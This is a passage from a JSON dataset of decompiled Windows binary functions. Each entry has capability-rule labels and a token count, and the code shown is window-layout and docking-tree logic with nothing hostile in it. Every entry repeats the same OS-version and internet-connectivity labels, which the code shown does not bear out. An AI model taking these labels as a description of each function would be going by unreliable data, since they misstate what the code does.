*(iVar2 + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = iVar2;\n        }\n        if (in_ECX == *(*(iVar2 + 0x14) + 8)) {\n            *(*(iVar2 + 0x14) + 8) = iVar2;\n        }\n        *(in_EDX + 0x14) = iVar2;\n        *(in_ECX + 0x14) = iVar2;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            *(in_ECX + 0x18) = in_EDX;\n            *(in_ECX + 0xc) = 0;\n            *(in_EDX + 0xc) = in_ECX;\n        }\n        else {\n            *(iVar2 + 8) = in_ECX;\n            *(in_ECX + 0x18) = 0;\n            *(in_ECX + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = in_ECX;\n        }\n    }\n    fcn.00459b6c();\n    fcn.00459f04();\n    fcn.0045a244(0x45bd40);\n    return;\n}\n",
        "token_count": 974
    },
    "0045a71c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0045a71c(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar1 = fcn.00459a30();\n    iVar2 = fcn.00459a30();\n    if (*(in_EAX + 0x1c) == '\\0') {\n        if (((iVar2 <= *in_ECX) && (*in_ECX <= *(in_EAX + 0x18) + iVar2)) && (iVar1 <= in_ECX[1])) {\n            iVar2 = fcn.00459ab4();\n            if (in_ECX[1] <= iVar1 + iVar2) {\n                var_5h = 1;\n                if (in_ECX[1] < *(*(in_EDX + 4) + 0x44) + 0xf) {\n                    *arg_8h = 0x14;\n                }\n                else {\n                    *arg_8h = 2;\n                }\n            }\n        }\n    }\n    else if (((iVar1 <= in_ECX[1]) && (in_ECX[1] <= iVar1 + *(in_EAX + 0x18))) && (iVar2 <= *in_ECX)) {\n        iVar1 = fcn.00459ab4();\n        if (*in_ECX <= iVar1 + iVar2) {\n            var_5h = 1;\n            if (*(*(in_EDX + 4) + 0x40) + *(*(in_EDX + 4) + 0x48) + -0xf < *in_ECX) {\n                *arg_8h = 0x14;\n            }\n            else {\n                *arg_8h = 2;\n            }\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 443
    },
    "0045a820": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.0045a820(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uchar *puStack40;\n    uint uStack36;\n    uchar auStack20 [4];\n    \n    iVar2 = fcn.00453b18();\n    iVar2 = iVar2 + -1;\n    if (-1 < iVar2) {\n        do {\n            piVar3 = fcn.00453adc();\n            if ((*(piVar3 + 0x57) != '\\0') && ((cVar1 = fcn.004047cc(),  cVar1 == '\\0' || (*(piVar3 + 0x1da) != '\\0'))))\n            {\n                fcn.00418360();\n                (**(*piVar3 + 0x44))(puStack40, uStack36);\n                puStack40 = auStack20;\n                iVar4 = sub.user32.dll_PtInRect();\n                if (iVar4 != 0) {\n                    return piVar3;\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return NULL;\n}\n",
        "token_count": 266
    },
    "0045a8ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a8ac(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.00459e88();\n        if (*(*(arg_8h + -4) + 4) <= iVar2) {\n            iVar2 = fcn.00459e88();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= *(*(arg_8h + -4) + 4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x0045a96f;\n            }\n        }\n    }\n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x02') {\n        iVar2 = fcn.00459e88();\n        if (**(arg_8h + -4) <= iVar2) {\n            iVar2 = fcn.00459e88();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= **(arg_8h + -4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x0045a96f;\n            }\n        }\n    }\n    if (*(in_EAX + 4) != 0) {\n        cVar1 = (**(**(arg_8h + -8) + 0x40))(*(arg_8h + -0xc));\n        if (cVar1 != '\\0') {\n            *(arg_8h + -0x10) = in_EAX;\n        }\n    }\ncode_r0x0045a96f:\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.00459f64();\n        if (iVar2 != 0) {\n            iVar2 = arg_8h;\n            fcn.00459f64();\n            fcn.0045a8ac(iVar2);\n        }\n    }\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.00459f8c();\n        if (iVar2 != 0) {\n            fcn.00459f8c();\n            fcn.0045a8ac(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 592
    },
    "0045a9c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045a9c0(uint *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *arg_8h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    var_10h = 0;\n    *param_1 = 0;\n    iVar1 = fcn.0045a820();\n    if ((iVar1 == 0) || (*(in_EAX + 0x14) != *(iVar1 + 0x94))) {\n        iVar2 = fcn.00459f8c();\n        if ((iVar2 != 0) && (iVar1 == 0)) {\n            fcn.00459f8c();\n            fcn.0045a8ac(arg_8h);\n        }\n    }\n    else {\n        var_10h = fcn.0045a1dc();\n        if (var_10h != 0) {\n            *param_1 = 1;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 264
    },
    "0045aa48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045aa48(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.0040546c();\n    (**(**(arg_8h + -4) + 0xc))();\n    if (0 < in_ECX) {\n        fcn.00405b8c();\n        (**(**(arg_8h + -4) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0045aa90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045aa90(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint uVar6;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uchar var_26h;\n    int32_t var_25h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack92 = 0x45add3;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack96;\n    var_ch = in_EAX;\n    var_4h = param_2;\n    fcn.0045b394();\n    var_25h._0_1_ = *(var_ch + 0x1d);\n    fcn.0045a16c();\n    uVar6 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    (**(*var_4h + 0xc))();\n    if (var_1ch == 0x40000) {\n        *(var_ch + 0x1d) = 0;\n        var_26h = 0;\n    }\n    else if (var_ch[0x1c] == var_1ch) {\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n    }\n    else {\n        var_40h = var_ch[0x1c];\n        var_3ch._0_1_ = 0;\n        var_38h = var_1ch;\n        var_34h._0_1_ = 0;\n        arg_ch = &var_40h;\n        uVar4 = 1;\n        fcn.004075f4();\n        fcn.0040daac(uVar4, arg_ch);\n        fcn.00404eb4();\n    }\n    (**(*var_4h + 0xc))();\n    if (-1 < var_20h + -1) {\n        var_30h = var_20h;\n        var_1ch = 0;\n        do {\n            fcn.0045aa48(&stack0xfffffffc);\n            if (var_8h != 0) {\n                fcn.0040483c();\n                if (var_10h != 0) {\n                    fcn.0044fbe4();\n                    uVar6 = 0;\n                    fcn.00450ac4(0);\n                }\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    (**(*var_4h + 0xc))();\n    if (*(var_ch + 0x1d) != '\\0') {\n        (**(*var_ch + 0x28))();\n        iVar2 = fcn.0045c484();\n        var_ch[0x1a] = iVar2;\n    }\n    var_18h = 0;\n    iVar2 = 0;\ncode_r0x0045ac2e:\n    do {\n        (**(*var_4h + 0xc))();\n        if (var_14h == *0x491754) {\n            *in_FS_OFFSET = uVar6;\n            *(var_ch + 0x1d) = var_25h;\n            if (var_ch[0x19] == 0) {\n                iVar2 = fcn.0045990c();\n                var_ch[0x19] = iVar2;\n            }\n            fcn.0045a170();\n            return;\n        }\n        iVar3 = fcn.0045990c();\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n        if (*(var_ch + 0x1d) != '\\0') {\n            (**(*var_ch + 0x28))();\n            uVar4 = fcn.0045c484();\n            *(iVar3 + 0x20) = uVar4;\n        }\n        fcn.0045aa48(&stack0xfffffffc);\n        if (var_8h != 0) {\n            cVar1 = fcn.00459c58();\n            if (cVar1 == '\\0') {\n                fcn.00404640();\n                goto code_r0x0045ac2e;\n            }\n        }\n        if (var_14h == 0) {\n            var_ch[0x19] = iVar3;\n        }\n        else if (var_14h == var_18h) {\n            iVar5 = iVar2;\n            if ((*(iVar2 + 0x18) != 0) && (*(iVar2 + 4) == 0)) {\n                iVar5 = *(iVar2 + 0x18);\n                var_2ch = iVar2;\n                fcn.00404640();\n            }\n            *(iVar5 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = iVar5;\n            *(iVar3 + 0x14) = *(iVar5 + 0x14);\n        }\n        else if (var_18h < var_14h) {\n            *(iVar2 + 8) = iVar3;\n            *(iVar3 + 0x14) = iVar2;\n        }\n        else if (var_14h < var_18h) {\n            unique0x10000202 = iVar2;\n            if (0 < var_18h - var_14h) {\n                var_1ch = 1;\n                var_30h = var_18h - var_14h;\n                do {\n                    unique0x00007a00 = *(stack0xffffffd8 + 0x14);\n                    var_1ch = var_1ch + 1;\n                    var_30h = var_30h + -1;\n                } while (var_30h != 0);\n            }\n            *(stack0xffffffd8 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = stack0xffffffd8;\n            *(iVar3 + 0x14) = *(stack0xffffffd8 + 0x14);\n        }\n        var_18h = var_14h;\n        iVar2 = iVar3;\n    } while( true );\n}\n",
        "token_count": 1571
    },
    "0045b0b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045b0b0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x45b0c9;\n    var_4h = fcn.0042497c();\n    uStack52 = 0x45b1d4;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x45b0e5;\n    puStack48 = &stack0xfffffffc;\n    fcn.0044e570();\n    puStack60 = 0x45b0ed;\n    fcn.00424c44();\n    uStack64 = 0x45b1b7;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x45b105;\n    puStack60 = &stack0xfffffffc;\n    fcn.00424f48();\n    uStack76 = 0x45b19a;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar1 = fcn.00453b18();\n    if (-1 < iVar1 + -1) {\n        var_8h = 0;\n        var_ch = iVar1;\n        do {\n            iVar1 = fcn.00453adc();\n            if ((*(iVar1 + 0x57) != '\\0') && (*(iVar1 + 0x94) == in_EAX[5])) {\n                fcn.0044f5e4();\n                (***in_EAX)();\n                (**(*in_EAX + 4))();\n                (**(*in_EAX + 0x20))(&fcn.0045b0b0::var_1ch);\n            }\n            var_8h = var_8h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x45b1a1;\n    uStack76 = 0x45b199;\n    fcn.00424f48();\n    return;\n}\n",
        "token_count": 592
    },
    "0045b1e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b1e4(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint *arg_8h_00;\n    int32_t var_1ch;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = fcn.00456470();\n    if (((in_ECX == 0) || (*(in_ECX + 0x90) == '\\0')) || (iVar2 < 2)) {\n        uVar3 = fcn.0044f684();\n        arg_8h_00 = &var_1ch;\n        fcn.0044f640();\n        fcn.00418388(arg_8h_00, uVar3);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n        if (0 < iVar2) {\n            if (arg_ch == '\\x01') {\n                arg_8h[3] = arg_8h[3] / 2;\n            }\n            else if (arg_ch == '\\x02') {\n                iVar2 = arg_8h[3] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[3] & 1U) != 0);\n                }\n                arg_8h[1] = iVar2;\n            }\n            else if (arg_ch == '\\x03') {\n                arg_8h[2] = arg_8h[2] / 2;\n            }\n            else if (arg_ch == '\\x04') {\n                iVar2 = arg_8h[2] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[2] & 1U) != 0);\n                }\n                *arg_8h = iVar2;\n            }\n        }\n    }\n    else {\n        var_4h = *(in_ECX + 0x40);\n        var_8h = *(in_ECX + 0x44);\n        uVar4 = *(in_ECX + 0x48);\n        var_ch = *(in_ECX + 0x4c);\n        if (arg_ch - 3U < 2) {\n            uVar1 = uVar4 & 1;\n            uVar4 = uVar4 >> 1;\n            if (uVar4 < 0) {\n                uVar4 = uVar4 + (uVar1 != 0);\n            }\n        }\n        else if (arg_ch - 1U < 2) {\n            var_ch = *(in_ECX + 0x4c) >> 1;\n            if (var_ch < 0) {\n                var_ch = var_ch + ((*(in_ECX + 0x4c) & 1) != 0);\n            }\n        }\n        if (arg_ch == '\\x02') {\n            var_8h = var_8h + var_ch;\n        }\n        else if (arg_ch == '\\x04') {\n            var_4h = var_4h + uVar4;\n        }\n        fcn.004183b0(&var_1ch, var_ch);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n    }\n    uVar3 = fcn.00457a28(0, arg_8h, 2);\n    sub.user32.dll_MapWindowPoints(uVar3);\n    return;\n}\n",
        "token_count": 890
    },
    "0045b430": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045b430(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY52;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack40 = 0x45b6c1;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar2 = &stack0xfffffffc;\n    if (param_2 == 0) {\n        fcn.004075f4();\n        uStackY52 = 0x45b470;\n        fcn.004075f4(&fcn.0045b430::var_4h);\n        fcn.00405738();\n        fcn.0040da70();\n        fcn.00404eb4();\n        puVar2 = puStack36;\n    }\n    puStack36 = puVar2;\n    if (*(param_2 + 4) == 0) {\n        fcn.004075f4();\n        uStackY52 = 0x45b4b1;\n        fcn.004075f4(&fcn.0045b430::var_ch);\n        fcn.00405738();\n        fcn.0040da70();\n        fcn.00404eb4();\n    }\n    iVar3 = fcn.00459930();\n    if (iVar3 == 1) {\n        iVar3 = *(in_EAX + 100);\n        *(iVar3 + 8) = 0;\n        *(iVar3 + 0x10) = 0;\n    }\n    else if (iVar3 == 2) {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            iVar3 = *(param_2 + 0xc);\n        }\n        if (*(iVar3 + 4) == 0) {\n            if (*(param_2 + 0x14) == *(in_EAX + 100)) {\n                fcn.00459ec4();\n                uVar4 = fcn.00459e88();\n                *(in_EAX + 0x68) = uVar4;\n                fcn.00404640();\n                *(in_EAX + 100) = iVar3;\n                *(iVar3 + 0xc) = 0;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0x14) = 0;\n                fcn.0045bd18();\n            }\n            else {\n                iVar1 = *(iVar3 + 8);\n                if (iVar1 == 0) {\n                    *(*(iVar3 + 0x14) + 8) = 0;\n                    fcn.00404640();\n                }\n                else {\n                    *(iVar1 + 0x18) = *(*(param_2 + 0x14) + 0x18);\n                    if (*(*(iVar3 + 8) + 0x18) == 0) {\n                        *(*(*(param_2 + 0x14) + 0x14) + 8) = iVar1;\n                    }\n                    else {\n                        *(*(*(iVar3 + 8) + 0x18) + 0xc) = iVar1;\n                    }\n                    iVar3 = *(iVar3 + 8);\n                    *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                    iVar1 = *(iVar3 + 0xc);\n                    while (iVar1 != 0) {\n                        iVar3 = *(iVar3 + 0xc);\n                        *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                        iVar1 = *(iVar3 + 0xc);\n                    }\n                    *(iVar3 + 0xc) = *(*(param_2 + 0x14) + 0xc);\n                    if (*(iVar3 + 0xc) != 0) {\n                        *(*(iVar3 + 0xc) + 0x18) = iVar3;\n                    }\n                    uStackY52 = 0x45bd40;\n                    fcn.0045a244();\n                    fcn.00404640();\n                    fcn.00404640();\n                }\n            }\n        }\n        else {\n            iVar1 = *(param_2 + 0x14);\n            if (*(in_EAX + 100) == iVar1) {\n                *(*(in_EAX + 100) + 8) = iVar3;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0xc) = 0;\n                fcn.004599e8();\n                fcn.00459eb0();\n                fcn.00459d0c();\n            }\n            else {\n                *(iVar1 + 0x10) = 0;\n                *(iVar1 + 4) = *(iVar3 + 4);\n                *(iVar1 + 8) = 0;\n                fcn.00404640();\n            }\n            uStackY52 = 0x45bd40;\n            fcn.0045a244();\n        }\n    }\n    else {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            *(*(param_2 + 0x14) + 8) = *(param_2 + 0xc);\n            *(*(param_2 + 0xc) + 0x18) = 0;\n            fcn.00459d0c();\n        }\n        else {\n            *(iVar3 + 0xc) = *(param_2 + 0xc);\n            if (*(param_2 + 0xc) != 0) {\n                *(*(param_2 + 0xc) + 0x18) = iVar3;\n            }\n            fcn.00459e88();\n            fcn.00459ec4();\n            fcn.00459d0c();\n        }\n        uStackY52 = 0x45bd40;\n        fcn.0045a244();\n    }\n    fcn.00404640();\n    *in_FS_OFFSET = uStackY52;\n    uStack44 = 0x45b6c8;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1465
    },
    "0045b874": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b874(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45b974;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (((in_EAX == *(*(arg_8h + -8) + 100)) || (*(in_EAX + 8) != 0)) ||\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 4) != 0)) {\n        (**(**(arg_8h + -4) + 0x10))();\n        (**(**(arg_8h + -4) + 0x10))();\n        if (*(*(arg_8h + -8) + 0x74) != '\\0') {\n            (**(**(arg_8h + -8) + 0x28))();\n            fcn.0045c4b4();\n        }\n        (**(**(arg_8h + -4) + 0x10))();\n        arg_8h_00 = arg_8h;\n        fcn.00459c14();\n        fcn.0045b7f8(arg_8h_00);\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045b874(arg_8h);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045b874(arg_8h);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x45b97b;\n    uStack32 = 0x45b973;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 478
    },
    "0045b984": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045b984(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x45bb2b;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x45b9b8;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45b9cb;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45b9e1;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45b9ed;\n    piVar1 = fcn.00404610();\n    uStack56 = 0x45baa4;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    iVar2 = fcn.004563dc();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.004563f0();\n            if ((*(iVar3 + 0x57) == '\\0') && (*(iVar3 + 8) != 0)) {\n                (**(*piVar1 + 0x38))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = (**(*piVar1 + 0x14))();\n    (**(*param_2 + 0x10))();\n    if (-1 < iVar2 + -1) {\n        do {\n            arg_8h = &stack0xfffffffc;\n            (**(*piVar1 + 0xc))();\n            fcn.0045b7f8(arg_8h);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x45baab;\n    uStack56 = 0x45baa3;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 597
    },
    "0045bd18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045bd18(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x6c) == 0) {\n        iVar1 = fcn.004563dc();\n        if (0 < iVar1) {\n            fcn.0045a244(0x45bd40);\n        }\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0045be50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045be50(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((in_EAX != *(arg_8h + -4)) && (*(*(in_EAX + 0x14) + 0x10) == *(*(*(arg_8h + -4) + 0x14) + 0x10))) {\n        iVar1 = fcn.00459e88();\n        iVar2 = fcn.00459e88();\n        if ((iVar2 < iVar1) && ((*(in_EAX + 4) == 0 || ((*(in_EAX + 4) != 0 && (*(*(in_EAX + 4) + 0x57) != '\\0')))))) {\n            iVar1 = *(arg_8h + -8);\n            iVar2 = fcn.00459e88();\n            if (iVar1 < iVar2) {\n                iVar2 = iVar1;\n            }\n            *(arg_8h + -8) = iVar2;\n        }\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045be50(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045be50(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "0045c02c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c02c(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x14) != 0) && (*(in_EAX + 0x14) != *(*(arg_8h + -4) + 100))) {\n        iVar2 = fcn.00459944();\n        if (iVar2 == 1) {\n            fcn.0045c02c(arg_8h);\n        }\n    }\n    iVar2 = fcn.00459944();\n    if ((iVar2 == 1) || (*(in_EAX + 0x24) == 0)) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n        iVar2 = *(*(arg_8h + -4) + 0x18) + *(*(arg_8h + -4) + 0xc) + 0xe;\n        iVar3 = fcn.00459f70();\n        if (iVar3 == 0) {\n            iVar3 = fcn.00459f64();\n            if (iVar3 != 0) {\n                fcn.00459f64();\n                iVar3 = fcn.00459e88();\n                if (iVar3 - *(in_EAX + 0x24) < iVar2) {\n                    bVar1 = true;\n                }\n                else {\n                    fcn.004599a0();\n                    fcn.00459eb0();\n                    fcn.00459f64();\n                    fcn.00459f04();\n                }\n            }\n        }\n        else {\n            fcn.00459f70();\n            iVar3 = fcn.00459e88();\n            iVar4 = fcn.004599a0();\n            if ((iVar3 - iVar4) - 